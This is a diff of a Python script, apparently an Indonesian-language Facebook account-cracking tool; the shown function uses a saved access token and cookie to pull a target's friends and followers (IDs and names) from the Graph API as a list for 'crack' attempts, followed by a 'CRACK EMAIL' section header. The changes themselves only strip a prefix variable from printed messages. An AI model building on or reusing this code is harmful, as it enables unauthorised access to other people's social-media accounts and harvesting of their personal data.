@@ -469,7 +469,7 @@ def dump3():
 	rprint(panel(x,style=f"bold purple"))
 	x=f"\t\t{P2}ketik {H2}Me{P2} untuk crack dari pertemanan"
 	rprint(panel(x,style=f"bold purple"))
-	put = input(garis+" Target id public :"+H+" ")
+	put = input(f" Target id public :"+H+" ")
 	try:
 		token = open('token.txt','r').read()
 		cookie = open('cookie.txt','r').read()
@@ -480,7 +480,7 @@ def dump3():
 		except (KeyError,IOError):
 			lk = M+"-"+P
 		#nama = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki).json()
-		#print(f"{garis} Mengambil ID Teman"+H+": "+nama["name"])
+		#print(f" Mengambil ID Teman"+H+": "+nama["name"])
 		#link = requests.get('https://graph.facebook.com/%s/fields=friends?fields=name,id,birthday&limit=1000&access_token=%s'%(put,token),cookies=coki)
 		#link_ = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
 		#try:
@@ -505,15 +505,15 @@ def dump3():
 		for fak in cini['subscribers']['data']:
 			try:id3.append(fak['id']+'|'+fak['name'])
 			except:continue
-		#print(maling_pangsit+" nama target :%s %s"(H,lk))
+		#print(f" nama target :%s %s"(H,lk))
 		x=f"{P2}Nama target : {H2}{lk}\n{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
 		rprint(panel(x,style=f"bold purple"))
 		settingers()
 	except requests.exceptions.ConnectionError:
-		jalan(garis+" koneksi internet bermasalah ")
+		jalan(" koneksi internet bermasalah ")
 		exit()
 	except (KeyError,IOError):
-		jalan(garis+" gagal dump id... mungkin privat friends/gada friends nya") 
+		jalan(" gagal dump id... mungkin privat friends/gada friends nya") 
 		exit()
 #-----------------[ CRACK EMAIL ]-----------------#
 def mail2():
